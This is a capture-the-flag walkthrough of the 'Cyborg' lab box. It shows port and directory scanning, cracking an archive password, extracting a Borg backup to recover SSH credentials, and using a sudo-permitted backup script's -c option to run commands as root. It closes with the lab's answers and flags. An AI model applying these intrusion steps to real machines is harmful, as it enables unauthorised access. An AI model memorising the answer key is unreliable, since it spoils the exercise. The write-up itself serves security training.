# Cyborg

A box involving encrypted archives, source code analysis and more.

```
ip = 10.10.141.201
```

## Nmap

```
nmap -sC -sV -oN initial.log 10.10.141.201
```

>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
>
>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

## Task 1.

Compromise the machine and read the user.txt and root.txt

```
nikto -h http://10.10.141.201 | tee nikto.log
```

Using **gobuster** I'm going to scan `http://10.10.141.201 /` for hidden directories or files using a wordlist and checks specified file extensions like php or txt.

```
gobuster dir -u http://10.10.141.201 / -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,sh,cgi,html,css,js,py
```

With this information I access `http://10.10.141.201/admin/index.html` to download a ZIP file. Also, I enter `http://10.10.141.201/etc/` where I obtain a password encrypted file that I can crack with JohnTheRipper (`music_archive:squidward`). Looking in the file I find a file that contains:

>This is a Borg Backup repository.
>
>See https://borgbackup.readthedocs.io/

Looking at the documentation I see that the zip contains a Borg Backup. To obtain it I use:

```
borg list final_archive/
Enter passphrase for key final_archive: 
music_archive                        Tue, 2020-12-29 15:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]


borg extract final_archive/::music_archive
```

With that commands I obtain the filesystem. However with this I dont have the required information. In the `Documents` folder I find a file whose contents are:

>Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
>
>alex:S3cretP@s3

With those credentials I can connect with the machine via ssh. Once in the machine I find the file `user.txt` with the first flag. To find the second flag I have to obtain root privileges. In order to achieve this task I use `linpeas`. I cannot obtain a root terminal but I find this:

```
sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```
 
This means I can execute `/etc/mp3backups/backup.sh` as a superuser. Upon reviewing the script's code, I discovered that if a command is provided with the -c option, it will also be executed. Therefore, I ran:

```
sudo ./backup.sh -c 'cat /root/root.txt'

...

flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

### Questions

1. Scan the machine, how many ports are open?
    >2
2. What service is running on port 22?
    >ssh
3. What service is running on port 80?
    >http
4. What is the user.txt flag?
    >flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
5. What is the root.txt flag?
    >flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}